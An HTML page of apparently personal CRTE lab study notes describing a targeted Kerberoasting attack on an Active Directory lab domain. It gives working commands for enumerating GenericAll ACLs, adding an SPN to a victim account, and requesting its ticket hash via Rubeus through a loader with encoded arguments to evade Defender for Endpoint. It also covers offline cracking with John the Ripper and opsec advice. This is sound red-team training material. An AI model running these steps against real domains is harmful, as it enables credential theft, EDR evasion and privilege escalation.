@@ -1,0 +1,303 @@
+---
+title: Privilege Escalation - Targeted Kerberoasting
+layout: docs
+---
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Privilege Escalation - Targeted Kerberoasting - CRTE</title>
+  <link rel="shortcut icon" href="../../../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../../../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .crtp-sidebar { padding: 20px; }
+    .crtp-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .crtp-sidebar .portfolio-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .crtp-sidebar .portfolio-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .crtp-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .crtp-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
+    .crtp-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
+    .main-content { max-width: 100% !important; }
+    .about { max-width: 100% !important; padding: 20px 40px !important; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1, .notion-content h2, .notion-content h3 { color: #fafafa; margin: 20px 0 10px; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content a { color: #ffdb70; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTE Study Notes</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="crtp-sidebar">
+          <a href="../../" class="portfolio-link">← Portfolio</a>
+          <h3>Sections</h3>
+          <a href="overview.html" class="">Overview</a>
+
+          <a href="part-01-introduction.html" class="">Introduction</a>
+          <a href="part-02-enumeration.html" class="">Enumeration</a>
+          <a href="part-03-privilege-escalation.html" class="">Privilege Escalation</a>
+          <a href="part-04-kerberoasting-attack.html" class="">Kerberoasting attack</a>
+          <a href="part-05-targeted-kerberoasting.html" class="active">Privilege Escalation - Targeted Kerberoasting</a>
+          <a href="part-06-laps-attack.html" class="">Privilege Escalation - LAPS Attack</a>
+          <a href="part-07-dumping-lsass-credentials.html" class="">Dumping LSASS Credentials</a>
+          <a href="part-08-gmsa-attack.html" class="">Privilege Escalation - gMSA Attack</a>
+          <a href="part-09-lsass-mde-bypass.html" class="">LSASS Attack With MDE Bypass</a>
+          <a href="part-10-pass-the-certificates-attack.html" class="">Pass The Certificates Attack</a>
+          <a href="part-11-unconstrained-delegation.html" class="">Privilege Escalation - Unconstrained Delegation</a>
+          <a href="part-12-constrained-delegation.html" class="">Privilege Escalation - Constrained Delegation</a>
+          <a href="part-13-rbcd.html" class="">Privilege Escalation - RBCD</a>
+          <a href="part-14-golden-ticket.html" class="">Domain Persistence - Golden Ticket attack</a>
+          <a href="part-15-silver-ticket.html" class="">Domain Persistence - Silver Ticket Attack</a>
+          <a href="part-16-diamond-ticket.html" class="">Domain Persistence - Diamond Ticket Attack</a>
+          <a href="part-17-skeleton-key.html" class="">Domain Persistence - Skeleton Key Attack</a>
+          <a href="part-18-sapphire-ticket.html" class="">Domain Persistence - Sapphire Ticket Attack</a>
+          <a href="part-19-adminsdholder.html" class="">Domain Persistence - AdminSDHolder attack</a>
+          <a href="part-20-adcs-attacks.html" class="">Cross Domain Attacks - ADCS Attacks</a>
+          <a href="part-21-shadow-credentials.html" class="">Shadow Credentials - Abusing User Object</a>
+          <a href="part-22-cross-domain-unconstrained.html" class="">Cross Domain Attacks - Unconstrained Delegation to Enterprise Admin</a>
+          <a href="part-23-azure-ad-phs.html" class="">Cross Domain Attacks - Azure AD Integration PHS</a>
+          <a href="part-24-child-to-forest-trust-key.html" class="">Cross Domain Attacks - Child to Forest Root - SID History Trust Key Abuse</a>
+          <a href="part-25-child-to-forest-sidhistory-krbtgt.html" class="">Cross Domain Attacks - Child to Forest Root - SID History KRBTGT Hash Abuse</a>
+          <a href="part-26-cross-forest-kerberoast.html" class="">Cross Forest Attacks - Kerberoast Attack</a>
+          <a href="part-27-protocol-transition.html" class="">Cross Forest Attacks - Constrained Delegation with Protocol Transition</a>
+          <a href="part-28-cross-forest-unconstrained.html" class="">Cross Forest Attacks - Unconstrained Delegation</a>
+          <a href="part-29-trust-key-shared-resources.html" class="">Cross Forest Attacks - Trust Key Abuse to Access Shared Resources</a>
+          <a href="part-30-injecting-sidhistory.html" class="">Cross Forest Attacks - Injecting SID History to Bypass SID Filtering</a>
+          <a href="part-31-mssql-database-links.html" class="">Trust Abuse - MSSQL Servers Database Links</a>
+          <a href="part-32-foreign-security-principals.html" class="">Cross Forest Attacks - Foreign Security Principals & ACLs</a>
+          <a href="part-33-pam-trust.html" class="">Cross Forest Attacks - Abusing PAM Trust</a>
+          <a href="part-34-trusting-to-trusted.html" class="">Cross Forest Attacks - Trusting to Trusted - Trust Key</a>
+          <a href="part-35-abusing-trust-transitivity.html" class="">Cross Forest Attacks - Abusing Trust Transitivity</a>
+        </div>
+        <div class="separator"></div>
+        <ul class="contacts-list">
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-back-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Back</p>
+              <a href="../../../" class="contact-link">Portfolio</a>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Privilege Escalation - Targeted Kerberoasting</header>
+        <section class="about-text notion-content">
+<p id="30c79e9a-d7c9-8012-baf6-fff8be220388" class="">A <strong>Targeted Kerberoasting Attack</strong> is a refined and focused form of the <strong>Kerberoasting</strong> technique, where an attacker specifically targets the Kerberos service tickets of a <strong>high-value service account</strong> (e.g., domain administrator, privileged service accounts). The goal is to extract the ticket&#x27;s encrypted portion (a Kerberos ticket-granting service (TGS) ticket), which is encrypted using the service account’s NTLM hash. Once obtained, the attacker attempts to crack the ticket offline to retrieve the service account’s password.</p><p id="30c79e9a-d7c9-8027-9e6c-deaf2689b673" class="">Unlike generic Kerberoasting, where an attacker enumerates and dumps all SPNs from the domain, a <strong>targeted attack</strong> involves precision. The attacker focuses only on accounts that are critical to achieving the engagement&#x27;s objectives, minimizing noise and reducing the chance of detection.</p><h3 id="30c79e9a-d7c9-807b-88a6-fc55e90d1a02" class="">Enumerating ACLs for Trageted Kerberoasting Attack with PowerView</h3><p id="30c79e9a-d7c9-8080-8960-ce3d6ccc64d4" class="">Let’s start by checking if our current user studentuser163 has any type of permission to set <code>User Account Control</code> on any object inside this domain.<br/>We will be using PowerView to accomplish this task.</p><p id="30c79e9a-d7c9-80f9-80a9-c429359bc068" class="">If we issue the command <code>Find-InterestingDomainACL -ResolveGUIDs</code> the command will enumerate <strong>all ACLs configured in the domain</strong> by default, not just those directly related to the current user we are logged in as. So because we dont want that, let’s be precise on our query and check all the ACLs of any group our user <code><strong>studentuser163</strong></code> is member has interesting permissions.</p><p id="30c79e9a-d7c9-800f-bcef-f9d9819041ee" class=""><code>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match &quot;StudentUsers&quot;}</code></p><pre id="30c79e9a-d7c9-8057-95c8-fef8a0a0dc9a" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">ObjectDN                : CN=Support151User,CN=Users,DC=us,DC=techcorp,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1116
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceDN     : CN=StudentUsers,CN=Users,DC=us,DC=techcorp,DC=local
+IdentityReferenceClass  : group
+
+------ SNIP -------
+
+ObjectDN                : CN=Support152User,CN=Users,DC=us,DC=techcorp,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1116
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceDN     : CN=StudentUsers,CN=Users,DC=us,DC=techcorp,DC=local
+IdentityReferenceClass  : group</code></pre><p id="30c79e9a-d7c9-803c-bd02-facbe6b385fb" class="">We can see above that we have <code><strong>GenericAll</strong></code> on several Objects. The output above has been SNIP because we do have lots of information. We can make a new query and get only the important property for us.<br/>Let’s make a new request, but this type we will filter based on the properties that are most important to us. This query will shorten the number of properties we have per object.</p><p id="30c79e9a-d7c9-80a3-ad07-e6d8b192ac7b" class=""><code>Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -Match &#x27;StudentUsers&#x27;} | Select -Property ObjectDN,ActiveDirectoryRights,IdentityReferenceName,IdentityReferenceDomain,IdentityReferenceClass</code></p><pre id="30c79e9a-d7c9-8013-9a54-d69c81a2866d" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">ObjectDN                : CN=Support151User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support152User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support153User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support154User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support155User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support156User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support157User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support158User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support159User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support160User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support161User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support162User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support163User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support164User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support165User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support166User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support167User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support168User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support169User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Support170User,CN=Users,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : GenericAll
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : OU=MailMgmt,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : ReadProperty, ExtendedRight
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=US-MAILMGMT,OU=MailMgmt,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : ReadProperty, ExtendedRight
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Windows Virtual Machine,CN=US-MAILMGMT,OU=MailMgmt,DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights   : ReadProperty, ExtendedRight
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceClass  : group</code></pre><p id="30c79e9a-d7c9-80a3-bee3-c568eb70638d" class="">Ok. Above we can see a smaller output for each of the Objects we do have Interesting Rights for being part of <code><strong>StudentUsers</strong></code> group and based on the output we do have GenericAll over several <strong>Support</strong><code><strong>X</strong></code><strong>Users</strong>. Let’s choose one specific Support user and see if Service Principal Name is enabled.<br/></p><h3 id="30c79e9a-d7c9-808a-8609-d07eda0362af" class="">Enumerating User with SPN enabled with ADModule</h3><p id="30c79e9a-d7c9-80c5-b052-dcbbdc7807a5" class="">After importing the ADModule, we can simply use the <code><strong>Get-ADUser</strong></code> and filter the<code><strong> ServiceprincipalName</strong></code> property of our target object.</p><p id="30c79e9a-d7c9-803c-8406-f2c7aee6a122" class=""><code>Get-ADUser -Identity support170user -Properties ServicePrincipalName | select ServicePrincipalName</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%2060.png" alt="Image"/><p id="30c79e9a-d7c9-806b-bcdd-c96d12256930" class="">The output above above shows us that our target user does not contains SPN enabled.<br/></p><p id="30c79e9a-d7c9-8040-8260-d0b68aaad4f5" class="">Because our current user <code><strong>studentuser163</strong></code> has <code><strong>GerenicAll</strong></code> over this user by being part of <code><strong>StudentUsers</strong></code> group, we can simply enable <strong>Service Principal Name</strong> for this specific target and query the ticket hash.</p><h3 id="30c79e9a-d7c9-8045-b698-d018f1498129" class="">Enabling SPN (Service Principal Name) on target with ADmodule</h3><p id="30c79e9a-d7c9-80f8-96f2-d512711cc822" class=""><code>Set-ADUser -Identity supportXuser -ServicePrincipalNames @{Add=&#x27;us/myspn170&#x27;} -Verbose</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%2061.png" alt="Image"/><p id="30c79e9a-d7c9-80a0-843f-d48f77db3288" class="">Now if we check it again, we can see now that our target user <code><strong>Support170User</strong></code> has SPN enabled.</p><p id="30c79e9a-d7c9-808c-bf70-d30eebfbb337" class=""><code>Get-ADUser -Identity support170user -Properties ServicePrincipalName | select ServicePrincipalName</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%2062.png" alt="Image"/><h3 id="30c79e9a-d7c9-80c1-ba7b-e50d7157e78f" class="">Enumerating User with SPN enabled with PowerView</h3><p id="30c79e9a-d7c9-80cf-97bf-faf99e03d089" class="">The same task we did using ADModule can also be achieved with PowerView Module.</p><p id="30c79e9a-d7c9-80a7-9a89-d730d5307a56" class=""><code>Get-DomainUser -Identity &#x27;Support170User&#x27; -Properties &#x27;ServicePrincipalName&#x27; | Select &#x27;ServicePrincipalName&#x27;</code></p><h3 id="30c79e9a-d7c9-8031-9e2d-c27545f35366" class="">Enabling SPN (Service Principal Name) on target with PowerView</h3><p id="30c79e9a-d7c9-80d3-830d-e2013315a2a2" class="">Let’s enable Service Principal Name to our target User with PowerView.</p><p id="30c79e9a-d7c9-8039-9fcf-ced70693917a" class=""><code>Set-DomainObject -Identity support170user -Set @{serviceprincipalname=&#x27;us/myspn170&#x27;} -Verbose</code></p><p id="30c79e9a-d7c9-808d-a5d9-d209a9fe11b8" class="">Now if we check it again.</p><p id="30c79e9a-d7c9-807d-88eb-d3c2275270e8" class=""><code>Get-DomainUser -Identity &#x27;Support170User&#x27; -Properties &#x27;ServicePrincipalName&#x27; | Select &#x27;ServicePrincipalName&#x27;</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%2063.png" alt="Image"/><p id="30c79e9a-d7c9-803d-b69b-ddfe04bfb24a" class="">We can see that we have enabled SPN to our target account.</p><h3 id="30c79e9a-d7c9-8020-8f4e-e8533750f517" class="">Requesting Service Accounts Hashes with Rubeus</h3><p id="30c79e9a-d7c9-808c-8a83-e67af5f36173" class="">Now the next step is to user Rubeus to request the SPN Ticket’s hash and try to crack it with John The Ripper.</p><p id="30c79e9a-d7c9-8010-91c1-fa135c257a00" class="">Remember that we want to avoid beong detected by the MDE so we will be using a NetLoader to execute Rubeus.exe and also encode the argument used for Rubeus.</p><p id="30c79e9a-d7c9-806a-8459-f185a8509ac0" class="">Let’s start by executing the ArgSpli.bat on our CMDline.</p><p id="30c79e9a-d7c9-806d-a2d8-f0a657056133" class=""><code>ArgSplit.bat</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%2064.png" alt="Image"/><p id="30c79e9a-d7c9-80fc-9e15-d00b80c97983" class="">We need to copy/paste the encoded string into CMDLine and if we echo the variable %Pwn% we can see that our variable is translated to “<code><strong>kerberoast</strong></code>”.</p><p id="30c79e9a-d7c9-8088-bc0b-f03f703935a9" class=""><code>echo %Pwn%</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%2065.png" alt="Image"/><p id="30c79e9a-d7c9-80b9-b03b-e4c0d1cf89f6" class="">We can now execute Rubeus.exe using the NetLoader and request the Service Account hash.</p><p id="30c79e9a-d7c9-80d4-af0a-f042cf455db5" class=""><code>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn%/user:supportXuser /simple /rc4opsec /outfile:C:\AD\Tools\support170user_SPN_Hash.txt</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%2066.png" alt="Image"/><p id="30c79e9a-d7c9-8042-b2e3-f1478f9f80be" class="">It’s possible to see that we were able to request the SPN hash and save it intos file named <strong>support170user_SPN_Hash.txt</strong>.</p><p id="30c79e9a-d7c9-8019-9156-ef5b4db781a7" class="">The command runs <strong>Rubeus</strong> via <strong>Loader.exe</strong> with arguments targeting the <code><strong>support170user</strong></code> in Active Directory to extract Kerberos hashes.</p><p id="30c79e9a-d7c9-809f-8946-f4031eb74bcf" class="">Key points:</p><ul><li><strong>Loader.exe</strong>: Executes <code>Rubeus.exe</code> while possibly bypassing certain security mechanisms like AV/EDR.</li></ul><ul><li><strong>/user:serviceaccount</strong>: Specifies the target service account.</li></ul><ul><li><strong>/simple</strong>: Simplifies the output for readability.</li></ul><ul><li><strong>/rc4opsec</strong>: Requests hashes only for accounts supporting RC4 encryption, avoiding accounts with stronger AES encryption.</li></ul><ul><li><strong>/outfile:C:\AD\Tools\support170user_SPN_hash.txt</strong>: Saves the extracted hash to the specified file.</li></ul><p id="30c79e9a-d7c9-8036-820f-f71928d97266" class="">This command targets the <code><strong>support170user</strong></code> to extract its RC4-encrypted Kerberos hash for offline cracking, with a focus on stealth and clarity.</p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%2067.png" alt="Image"/><h2 id="30c79e9a-d7c9-80a0-8e4e-c59990e08138" class="">Cracking SPN Hashes with John The Ripper</h2><p id="30c79e9a-d7c9-8064-8a72-c7570d2810c9" class="">Now that we were able to get the user <code><strong>support170user</strong></code> SVC hash, we can use John The Ripper to try to crack this service account hash. </p><p id="30c79e9a-d7c9-8085-80ba-e85a9c2a994d" class=""><code>C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\support170use_SPN_Hash.txt</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%2068.png" alt="Image"/><p id="30c79e9a-d7c9-80ef-94c7-ed19b1c916b7" class="">Amazing, we were able to crack the targeted  <code><strong>support170user</strong></code> SVC account.</p><h3 id="30c79e9a-d7c9-80e6-b4ff-f468c8f5d533" class="">There are some key points I would like to discuss about this type of attack.</h3><p id="30c79e9a-d7c9-808d-89e4-d89e9191358a" class="">it&#x27;s excellent that we think about the <strong>trade-offs between stealth and practicality</strong> during a targeted Kerberoasting attack. Because we do have <code><strong>GenericAll</strong></code> over an Object, probably our 1st thought would be Object account password reset. <code><strong>THIS SHOULD BE OUR LAST OPTION</strong></code>.<br/></p><p id="30c79e9a-d7c9-80f7-aded-c597c027db6d" class="">Let&#x27;s break it down and evaluate the reasons and risks involved in each approach.</p><h3 id="30c79e9a-d7c9-80c0-a343-f63a53c515fe" class="">Why Opt for Targeted Kerberoasting Instead of Changing the User&#x27;s Password?</h3><ol><li><strong>Stealth and OpSec:</strong><ul><li><strong>Kerberoasting:</strong> When you perform a Kerberoasting attack, the attack is relatively stealthy because requesting a Kerberos service ticket is a legitimate operation in an Active Directory environment. It blends in with normal traffic and is less likely to trigger alarms in monitoring solutions like SIEMs, EDRs, or AVs.</li></ul><ul><li><strong>Changing Passwords:</strong> Resetting or changing a user&#x27;s password (even if you have <code>GenericAll</code> rights) is highly disruptive and noisy. It often generates <strong>security logs</strong> (e.g., Event ID 4724 or Event ID 4720) and alerts in SIEMs. This activity can quickly raise suspicion, especially if the account is being actively used by legitimate users or services.</li></ul></li></ol><ol><li><strong>Avoid Breaking Functionality:</strong><ul><li>Service accounts often run critical applications or services. Changing their password can <strong>break dependencies</strong>, disrupt services, and create visible operational issues, making it far easier for the defenders to detect your activity. By using Kerberoasting, you&#x27;re passively attempting to extract the credentials without interfering with their operational use.</li></ul></li></ol><ol><li><strong>Offline Cracking Flexibility:</strong><ul><li>When you retrieve the service ticket during Kerberoasting, you have the <strong>luxury of time</strong> to crack the hash offline. If you fail to crack it with your current wordlist or cracking techniques, you can revisit the hash later with updated tools, better resources (e.g., GPU clusters), or additional intelligence about likely passwords.</li></ul></li></ol><h3 id="30c79e9a-d7c9-8043-9941-e35bb5e8bffc" class="">What If You Can’t Crack the Hash?</h3><p id="30c79e9a-d7c9-80af-a537-c9e11d695af7" class="">If your wordlist doesn’t contain the correct password or the hash can&#x27;t be cracked due to complexity or insufficient resources, <strong>Kerberoasting doesn&#x27;t burn any bridges</strong>:</p><ul><li>The account remains intact, and its password remains unknown to you, but your OpSec is maintained.</li></ul><ul><li>You can continue exploring other techniques to compromise the target without raising alarms.</li></ul><p id="30c79e9a-d7c9-8060-bcb4-f316003f2837" class="">In contrast, if you had changed the password and didn&#x27;t have a way to revert it:</p><ul><li>You’ve alerted defenders immediately.</li></ul><ul><li>You’ve burned access to that account, as the legitimate user or service will notice the change.</li></ul><h3 id="30c79e9a-d7c9-802c-a54e-f00fcbeaf3f2" class="">When Would Changing the Password Be a Better Choice?</h3><p id="30c79e9a-d7c9-80c1-8f35-f4673c9bb517" class="">In rare scenarios, changing the password might be a better option if:</p><ul><li><strong>Time Sensitivity:</strong> You&#x27;re under strict time constraints and need guaranteed access immediately. In this case, you can change the password and gain full control of the account, though it sacrifices stealth.</li></ul><ul><li><strong>Cracking Fails and No Other Options Exist:</strong> If Kerberoasting doesn&#x27;t yield results, and the account is critical to achieving your objective, resetting the password might be a calculated risk to achieve your goal.</li></ul><h3 id="30c79e9a-d7c9-8081-9c33-e4298c10e5cb" class="">Why Targeted Kerberoasting Is Usually Preferred</h3><ol><li><strong>Stealth:</strong> The operation doesn&#x27;t stand out unless the domain is explicitly monitoring for excessive service ticket requests or unusual SPN activity.</li></ol><ol><li><strong>No Disruption:</strong> The target account remains operational and undisturbed.</li></ol><ol><li><strong>Future Flexibility:</strong> Even if cracking fails initially, the hash is a long-term asset. If you gain better cracking tools or intelligence later, you can revisit it.</li></ol><p id="30c79e9a-d7c9-80df-9a21-f59fcaf45eb8" class="">The choice between <strong>stealth (Kerberoasting)</strong> and <strong>disruption (password reset)</strong> depends on the engagement&#x27;s goals, timelines, and OpSec requirements. In most cases, Kerberoasting is the safer and more professional approach in Red Team operations because it maintains your cover while still giving you a shot at the target&#x27;s credentials. If cracking the hash fails, you still have the opportunity to explore alternative attack paths without alerting defenders.</p>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <script src="../../../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
